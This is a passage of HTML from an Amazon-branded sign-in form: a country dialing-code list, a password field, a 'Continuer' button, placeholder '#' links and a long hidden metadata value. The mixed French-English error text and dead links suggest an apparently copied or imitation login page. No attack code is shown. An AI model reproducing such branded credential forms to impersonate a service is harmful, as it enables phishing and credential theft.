            Japan <span dir="ltr">+81</span>
          </span></li>
        
          
          
          <li data-country-code-text="JO +962" data-value="JO"><span class="a-list-item">
            Jordan <span dir="ltr">+962</span>
          </span></li>
        
          
          
          <li data-country-code-text="KZ +7" data-value="KZ"><span class="a-list-item">
            Kazakhstan <span dir="ltr">+7</span>
          </span></li>
        
          
          
          <li data-country-code-text="KE +254" data-value="KE"><span class="a-list-item">
            Kenya <span dir="ltr">+254</span>
          </span></li>
        
          
          
          <li data-country-code-text="KI +686" data-value="KI"><span class="a-list-item">
            Kiribati <span dir="ltr">+686</span>
          </span></li>
        
          
          
          <li data-country-code-text="XK +383" data-value="XK"><span class="a-list-item">
            Kosovo <span dir="ltr">+383</span>
          </span></li>
        
          
          
          <li data-country-code-text="KW +965" data-value="KW"><span class="a-list-item">
            Kuwait <span dir="ltr">+965</span>
          </span></li>
        
          
          
          <li data-country-code-text="KG +996" data-value="KG"><span class="a-list-item">
            Kyrgyzstan <span dir="ltr">+996</span>
          </span></li>
        
          
          
          <li data-country-code-text="LA +856" data-value="LA"><span class="a-list-item">
            Laos <span dir="ltr">+856</span>
          </span></li>
        
          
          
          <li data-country-code-text="LV +371" data-value="LV"><span class="a-list-item">
            Latvia <span dir="ltr">+371</span>
          </span></li>
        
          
          
          <li data-country-code-text="LB +961" data-value="LB"><span class="a-list-item">
            Lebanon <span dir="ltr">+961</span>
          </span></li>
        
          
          
          <li data-country-code-text="LS +266" data-value="LS"><span class="a-list-item">
            Lesotho <span dir="ltr">+266</span>
          </span></li>
        
          
          
          <li data-country-code-text="LR +231" data-value="LR"><span class="a-list-item">
            Liberia <span dir="ltr">+231</span>
          </span></li>
        
          
          
          <li data-country-code-text="LY +218" data-value="LY"><span class="a-list-item">
            Libya <span dir="ltr">+218</span>
          </span></li>
        
          
          
          <li data-country-code-text="LI +423" data-value="LI"><span class="a-list-item">
            Liechtenstein <span dir="ltr">+423</span>
          </span></li>
        
          
          
          <li data-country-code-text="LT +370" data-value="LT"><span class="a-list-item">
            Lithuania <span dir="ltr">+370</span>
          </span></li>
        
          
          
          <li data-country-code-text="LU +352" data-value="LU"><span class="a-list-item">
            Luxembourg <span dir="ltr">+352</span>
          </span></li>
        
          
          
          <li data-country-code-text="MO +853" data-value="MO"><span class="a-list-item">
            Macau <span dir="ltr">+853</span>
          </span></li>
        
          
          
          <li data-country-code-text="MK +389" data-value="MK"><span class="a-list-item">
            Macedonia <span dir="ltr">+389</span>
          </span></li>
        
          
          
          <li data-country-code-text="MG +261" data-value="MG"><span class="a-list-item">
            Madagascar <span dir="ltr">+261</span>
          </span></li>
        
          
          
          <li data-country-code-text="MW +265" data-value="MW"><span class="a-list-item">
            Malawi <span dir="ltr">+265</span>
          </span></li>
        
          
          
          <li data-country-code-text="MY +60" data-value="MY"><span class="a-list-item">
            Malaysia <span dir="ltr">+60</span>
          </span></li>
        
          
          
          <li data-country-code-text="MV +960" data-value="MV"><span class="a-list-item">
            Maldives <span dir="ltr">+960</span>
          </span></li>
        
          
          
          <li data-country-code-text="ML +223" data-value="ML"><span class="a-list-item">
            Mali <span dir="ltr">+223</span>
          </span></li>
        
          
          
          <li data-country-code-text="MT +356" data-value="MT"><span class="a-list-item">
            Malta <span dir="ltr">+356</span>
          </span></li>
        
          
          
          <li data-country-code-text="MH +692" data-value="MH"><span class="a-list-item">
            Marshall Islands <span dir="ltr">+692</span>
          </span></li>
        
          
          
          <li data-country-code-text="MQ +596" data-value="MQ"><span class="a-list-item">
            Martinique <span dir="ltr">+596</span>
          </span></li>
        
          
          
          <li data-country-code-text="MR +222" data-value="MR"><span class="a-list-item">
            Mauritania <span dir="ltr">+222</span>
          </span></li>
        
          
          
          <li data-country-code-text="MU +230" data-value="MU"><span class="a-list-item">
            Mauritius <span dir="ltr">+230</span>
          </span></li>
        
          
          
          <li data-country-code-text="MX +52" data-value="MX"><span class="a-list-item">
            Mexico <span dir="ltr">+52</span>
          </span></li>
        
          
          
          <li data-country-code-text="FM +691" data-value="FM"><span class="a-list-item">
            Micronesia <span dir="ltr">+691</span>
          </span></li>
        
          
          
          <li data-country-code-text="MD +373" data-value="MD"><span class="a-list-item">
            Moldova <span dir="ltr">+373</span>
          </span></li>
        
          
          
          <li data-country-code-text="MC +377" data-value="MC"><span class="a-list-item">
            Monaco <span dir="ltr">+377</span>
          </span></li>
        
          
          
          <li data-country-code-text="MN +976" data-value="MN"><span class="a-list-item">
            Mongolia <span dir="ltr">+976</span>
          </span></li>
        
          
          
          <li data-country-code-text="ME +382" data-value="ME"><span class="a-list-item">
            Montenegro <span dir="ltr">+382</span>
          </span></li>
        
          
          
          <li data-country-code-text="MS +1" data-value="MS"><span class="a-list-item">
            Montserrat <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="MA +212" data-value="MA"><span class="a-list-item">
            Morocco <span dir="ltr">+212</span>
          </span></li>
        
          
          
          <li data-country-code-text="MZ +258" data-value="MZ"><span class="a-list-item">
            Mozambique <span dir="ltr">+258</span>
          </span></li>
        
          
          
          <li data-country-code-text="MM +95" data-value="MM"><span class="a-list-item">
            Myanmar (Burma) <span dir="ltr">+95</span>
          </span></li>
        
          
          
          <li data-country-code-text="NA +264" data-value="NA"><span class="a-list-item">
            Namibia <span dir="ltr">+264</span>
          </span></li>
        
          
          
          <li data-country-code-text="NR +674" data-value="NR"><span class="a-list-item">
            Nauru <span dir="ltr">+674</span>
          </span></li>
        
          
          
          <li data-country-code-text="NP +977" data-value="NP"><span class="a-list-item">
            Nepal <span dir="ltr">+977</span>
          </span></li>
        
          
          
          <li data-country-code-text="NL +31" data-value="NL"><span class="a-list-item">
            Netherlands <span dir="ltr">+31</span>
          </span></li>
        
          
          
          <li data-country-code-text="NC +687" data-value="NC"><span class="a-list-item">
            New Caledonia <span dir="ltr">+687</span>
          </span></li>
        
          
          
          <li data-country-code-text="NZ +64" data-value="NZ"><span class="a-list-item">
            New Zealand <span dir="ltr">+64</span>
          </span></li>
        
          
          
          <li data-country-code-text="NI +505" data-value="NI"><span class="a-list-item">
            Nicaragua <span dir="ltr">+505</span>
          </span></li>
        
          
          
          <li data-country-code-text="NE +227" data-value="NE"><span class="a-list-item">
            Niger <span dir="ltr">+227</span>
          </span></li>
        
          
          
          <li data-country-code-text="NG +234" data-value="NG"><span class="a-list-item">
            Nigeria <span dir="ltr">+234</span>
          </span></li>
        
          
          
          <li data-country-code-text="NU +683" data-value="NU"><span class="a-list-item">
            Niue <span dir="ltr">+683</span>
          </span></li>
        
          
          
          <li data-country-code-text="NF +672" data-value="NF"><span class="a-list-item">
            Norfolk Island <span dir="ltr">+672</span>
          </span></li>
        
          
          
          <li data-country-code-text="KP +850" data-value="KP"><span class="a-list-item">
            North Korea <span dir="ltr">+850</span>
          </span></li>
        
          
          
          <li data-country-code-text="NO +47" data-value="NO"><span class="a-list-item">
            Norway <span dir="ltr">+47</span>
          </span></li>
        
          
          
          <li data-country-code-text="OM +968" data-value="OM"><span class="a-list-item">
            Oman <span dir="ltr">+968</span>
          </span></li>
        
          
          
          <li data-country-code-text="PK +92" data-value="PK"><span class="a-list-item">
            Pakistan <span dir="ltr">+92</span>
          </span></li>
        
          
          
          <li data-country-code-text="PW +680" data-value="PW"><span class="a-list-item">
            Palau <span dir="ltr">+680</span>
          </span></li>
        
          
          
          <li data-country-code-text="PS +970" data-value="PS"><span class="a-list-item">
            Palestinian Territories <span dir="ltr">+970</span>
          </span></li>
        
          
          
          <li data-country-code-text="PA +507" data-value="PA"><span class="a-list-item">
            Panama <span dir="ltr">+507</span>
          </span></li>
        
          
          
          <li data-country-code-text="PG +675" data-value="PG"><span class="a-list-item">
            Papua New Guinea <span dir="ltr">+675</span>
          </span></li>
        
          
          
          <li data-country-code-text="PY +595" data-value="PY"><span class="a-list-item">
            Paraguay <span dir="ltr">+595</span>
          </span></li>
        
          
          
          <li data-country-code-text="PE +51" data-value="PE"><span class="a-list-item">
            Peru <span dir="ltr">+51</span>
          </span></li>
        
          
          
          <li data-country-code-text="PH +63" data-value="PH"><span class="a-list-item">
            Philippines <span dir="ltr">+63</span>
          </span></li>
        
          
          
          <li data-country-code-text="PL +48" data-value="PL"><span class="a-list-item">
            Poland <span dir="ltr">+48</span>
          </span></li>
        
          
          
          <li data-country-code-text="PT +351" data-value="PT"><span class="a-list-item">
            Portugal <span dir="ltr">+351</span>
          </span></li>
        
          
          
          <li data-country-code-text="PR +1" data-value="PR"><span class="a-list-item">
            Puerto Rico <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="QA +974" data-value="QA"><span class="a-list-item">
            Qatar <span dir="ltr">+974</span>
          </span></li>
        
          
          
          <li data-country-code-text="RO +40" data-value="RO"><span class="a-list-item">
            Romania <span dir="ltr">+40</span>
          </span></li>
        
          
          
          <li data-country-code-text="RU +7" data-value="RU"><span class="a-list-item">
            Russia <span dir="ltr">+7</span>
          </span></li>
        
          
          
          <li data-country-code-text="RW +250" data-value="RW"><span class="a-list-item">
            Rwanda <span dir="ltr">+250</span>
          </span></li>
        
          
          
          <li data-country-code-text="RE +262" data-value="RE"><span class="a-list-item">
            Réunion <span dir="ltr">+262</span>
          </span></li>
        
          
          
          <li data-country-code-text="WS +685" data-value="WS"><span class="a-list-item">
            Samoa <span dir="ltr">+685</span>
          </span></li>
        
          
          
          <li data-country-code-text="SM +378" data-value="SM"><span class="a-list-item">
            San Marino <span dir="ltr">+378</span>
          </span></li>
        
          
          
          <li data-country-code-text="SA +966" data-value="SA"><span class="a-list-item">
            Saudi Arabia <span dir="ltr">+966</span>
          </span></li>
        
          
          
          <li data-country-code-text="SN +221" data-value="SN"><span class="a-list-item">
            Senegal <span dir="ltr">+221</span>
          </span></li>
        
          
          
          <li data-country-code-text="RS +381" data-value="RS"><span class="a-list-item">
            Serbia <span dir="ltr">+381</span>
          </span></li>
        
          
          
          <li data-country-code-text="SC +248" data-value="SC"><span class="a-list-item">
            Seychelles <span dir="ltr">+248</span>
          </span></li>
        
          
          
          <li data-country-code-text="SL +232" data-value="SL"><span class="a-list-item">
            Sierra Leone <span dir="ltr">+232</span>
          </span></li>
        
          
          
          <li data-country-code-text="SG +65" data-value="SG"><span class="a-list-item">
            Singapore <span dir="ltr">+65</span>
          </span></li>
        
          
          
          <li data-country-code-text="SX +1" data-value="SX"><span class="a-list-item">
            Sint Maarten <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="SK +421" data-value="SK"><span class="a-list-item">
            Slovakia <span dir="ltr">+421</span>
          </span></li>
        
          
          
          <li data-country-code-text="SI +386" data-value="SI"><span class="a-list-item">
            Slovenia <span dir="ltr">+386</span>
          </span></li>
        
          
          
          <li data-country-code-text="SB +677" data-value="SB"><span class="a-list-item">
            Solomon Islands <span dir="ltr">+677</span>
          </span></li>
        
          
          
          <li data-country-code-text="SO +252" data-value="SO"><span class="a-list-item">
            Somalia <span dir="ltr">+252</span>
          </span></li>
        
          
          
          <li data-country-code-text="ZA +27" data-value="ZA"><span class="a-list-item">
            South Africa <span dir="ltr">+27</span>
          </span></li>
        
          
          
          <li data-country-code-text="KR +82" data-value="KR"><span class="a-list-item">
            South Korea <span dir="ltr">+82</span>
          </span></li>
        
          
          
          <li data-country-code-text="SS +211" data-value="SS"><span class="a-list-item">
            South Sudan <span dir="ltr">+211</span>
          </span></li>
        
          
          
          <li data-country-code-text="ES +34" data-value="ES"><span class="a-list-item">
            Spain <span dir="ltr">+34</span>
          </span></li>
        
          
          
          <li data-country-code-text="LK +94" data-value="LK"><span class="a-list-item">
            Sri Lanka <span dir="ltr">+94</span>
          </span></li>
        
          
          
          <li data-country-code-text="KN +1" data-value="KN"><span class="a-list-item">
            St. Kitts &amp; Nevis <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="LC +1" data-value="LC"><span class="a-list-item">
            St. Lucia <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="PM +508" data-value="PM"><span class="a-list-item">
            St. Pierre &amp; Miquelon <span dir="ltr">+508</span>
          </span></li>
        
          
          
          <li data-country-code-text="VC +1" data-value="VC"><span class="a-list-item">
            St. Vincent &amp; Grenadines <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="SD +249" data-value="SD"><span class="a-list-item">
            Sudan <span dir="ltr">+249</span>
          </span></li>
        
          
          
          <li data-country-code-text="SR +597" data-value="SR"><span class="a-list-item">
            Suriname <span dir="ltr">+597</span>
          </span></li>
        
          
          
          <li data-country-code-text="SZ +268" data-value="SZ"><span class="a-list-item">
            Swaziland <span dir="ltr">+268</span>
          </span></li>
        
          
          
          <li data-country-code-text="SE +46" data-value="SE"><span class="a-list-item">
            Sweden <span dir="ltr">+46</span>
          </span></li>
        
          
          
          <li data-country-code-text="CH +41" data-value="CH"><span class="a-list-item">
            Switzerland <span dir="ltr">+41</span>
          </span></li>
        
          
          
          <li data-country-code-text="SY +963" data-value="SY"><span class="a-list-item">
            Syria <span dir="ltr">+963</span>
          </span></li>
        
          
          
          <li data-country-code-text="ST +239" data-value="ST"><span class="a-list-item">
            São Tomé &amp; Príncipe <span dir="ltr">+239</span>
          </span></li>
        
          
          
          <li data-country-code-text="TW +886" data-value="TW"><span class="a-list-item">
            Taiwan <span dir="ltr">+886</span>
          </span></li>
        
          
          
          <li data-country-code-text="TJ +992" data-value="TJ"><span class="a-list-item">
            Tajikistan <span dir="ltr">+992</span>
          </span></li>
        
          
          
          <li data-country-code-text="TZ +255" data-value="TZ"><span class="a-list-item">
            Tanzania <span dir="ltr">+255</span>
          </span></li>
        
          
          
          <li data-country-code-text="TH +66" data-value="TH"><span class="a-list-item">
            Thailand <span dir="ltr">+66</span>
          </span></li>
        
          
          
          <li data-country-code-text="TL +670" data-value="TL"><span class="a-list-item">
            Timor-Leste <span dir="ltr">+670</span>
          </span></li>
        
          
          
          <li data-country-code-text="TG +228" data-value="TG"><span class="a-list-item">
            Togo <span dir="ltr">+228</span>
          </span></li>
        
          
          
          <li data-country-code-text="TO +676" data-value="TO"><span class="a-list-item">
            Tonga <span dir="ltr">+676</span>
          </span></li>
        
          
          
          <li data-country-code-text="TT +1" data-value="TT"><span class="a-list-item">
            Trinidad &amp; Tobago <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="TN +216" data-value="TN"><span class="a-list-item">
            Tunisia <span dir="ltr">+216</span>
          </span></li>
        
          
          
          <li data-country-code-text="TR +90" data-value="TR"><span class="a-list-item">
            Turkey <span dir="ltr">+90</span>
          </span></li>
        
          
          
          <li data-country-code-text="TM +993" data-value="TM"><span class="a-list-item">
            Turkmenistan <span dir="ltr">+993</span>
          </span></li>
        
          
          
          <li data-country-code-text="TC +1" data-value="TC"><span class="a-list-item">
            Turks &amp; Caicos Islands <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="TV +688" data-value="TV"><span class="a-list-item">
            Tuvalu <span dir="ltr">+688</span>
          </span></li>
        
          
          
          <li data-country-code-text="VI +1" data-value="VI"><span class="a-list-item">
            U.S. Virgin Islands <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="UG +256" data-value="UG"><span class="a-list-item">
            Uganda <span dir="ltr">+256</span>
          </span></li>
        
          
          
          <li data-country-code-text="UA +380" data-value="UA"><span class="a-list-item">
            Ukraine <span dir="ltr">+380</span>
          </span></li>
        
          
          
          <li data-country-code-text="AE +971" data-value="AE"><span class="a-list-item">
            United Arab Emirates <span dir="ltr">+971</span>
          </span></li>
        
          
          
          <li data-country-code-text="GB +44" data-value="GB"><span class="a-list-item">
            United Kingdom <span dir="ltr">+44</span>
          </span></li>
        
          
          
          <li data-country-code-text="US +1" data-value="US" class="selected"><span class="a-list-item">
            United States <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="UY +598" data-value="UY"><span class="a-list-item">
            Uruguay <span dir="ltr">+598</span>
          </span></li>
        
          
          
          <li data-country-code-text="UZ +998" data-value="UZ"><span class="a-list-item">
            Uzbekistan <span dir="ltr">+998</span>
          </span></li>
        
          
          
          <li data-country-code-text="VU +678" data-value="VU"><span class="a-list-item">
            Vanuatu <span dir="ltr">+678</span>
          </span></li>
        
          
          
          <li data-country-code-text="VE +58" data-value="VE"><span class="a-list-item">
            Venezuela <span dir="ltr">+58</span>
          </span></li>
        
          
          
          <li data-country-code-text="VN +84" data-value="VN"><span class="a-list-item">
            Vietnam <span dir="ltr">+84</span>
          </span></li>
        
          
          
          <li data-country-code-text="YE +967" data-value="YE"><span class="a-list-item">
            Yemen <span dir="ltr">+967</span>
          </span></li>
        
          
          
          <li data-country-code-text="ZM +260" data-value="ZM"><span class="a-list-item">
            Zambia <span dir="ltr">+260</span>
          </span></li>
        
          
          
          <li data-country-code-text="ZW +263" data-value="ZW"><span class="a-list-item">
            Zimbabwe <span dir="ltr">+263</span>
          </span></li>
        
          
          
          <li data-country-code-text="AX +358" data-value="AX"><span class="a-list-item">
            Åland Islands <span dir="ltr">+358</span>
          </span></li>
        
      </ul>
    </span>
  </div>
</div>
      </div>
    
    
  

  

  
    
    
      <div class="a-input-text-wrapper hide"><input type="password" maxlength="1024" id="ap-credential-autofill-hint" name="password"></div>
    
  
  
  



<div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  Saisissez votre adresse Email or phone number portable
</div></div></div>

</div>

<div class="a-row">
  
    







  
</div>

<div class="a-section">
  <div class="a-button-stack">
    
      
        <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" class="a-button-input" type="submit" name="auth" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true">
          Continuer
        </span></span></span>
        
        
          <div class="a-section a-spacing-medium">
            



<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
  By continuing, you agree to Amazon's  <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
</div> 

          </div>
        
      
      
    
    
<script>
  function cf() {
    if (typeof window.uet === 'function') {
      uet('cf');
    }
    if (window.embedNotification &&
      typeof window.embedNotification.onCF === 'function') {
      embedNotification.onCF();
    }
  }
</script>

<script type="text/javascript">cf()</script>

  </div>
</div>


  



<div class="a-section">
  <div class="a-row a-expander-container a-expander-inline-container">
    <a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}" data-csa-c-id="ftnxks-jyqnzl-5qxnf8-dzrscf"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
    Need help&nbsp;?
    </span></a>
    
      <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
        



  
  
    
  

<a id="auth-fpp-link-bottom" class="a-link-normal" href="#">
  
Forgot your password?
</a>
      </div>
    
    <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
      <a id="ap-other-signin-issues-link" class="a-link-normal" href="#">
       
      Other issues with Sign-In
          
      </a>
    </div>
  </div>
</div>



              
            
          
          
        

        

        




  
  
  
    
      
      
      
        
        
      
    
  


        
      <input name="metadata1" type="hidden" value="ECdITeCs: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